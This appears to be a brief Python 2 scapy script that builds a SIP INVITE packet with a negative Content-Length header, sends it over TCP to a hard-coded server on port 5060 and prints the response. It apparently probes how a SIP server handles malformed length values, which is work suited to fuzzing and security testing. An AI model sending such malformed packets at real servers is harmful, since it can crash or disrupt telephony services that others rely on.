#!/usr/bin/python2
from scapy.all import *
client = "135.105.99.22"
#server = "135.122.41.207"
server = "135.122.41.57"
client_port = 5061
server_port = 5060
#server_port = 34647
#SIP Payload
sip = ("INVITE sip:55501@" + server + " SIP/2.0\r\n" 
"To: <sip:" + server + ":" + str(server_port) + ">\r\n" 
"Via: SIP/2.0/TCP " + client + ":" + str(client_port) + "\r\n" 
"From: \x22xtestsip\x22<sip:" + server + ":" + str(server_port) + ">\r\n" 
"Call-ID: f9844fbe7dec140ca36500a0c91e6bf5@localhost\r\n" 
"CSeq: 1 INVITE\r\n" 
"Max-Forwards: 70\r\n" 
"Content-Type: application/sdp\r\n" 
"Content-Length: -1\r\n\r\n")
pkt= Ether()/IP(src=client, dst=server)/TCP(sport=client_port, dport=server_port)/sip
resp = srp1(pkt)
print(resp.show())
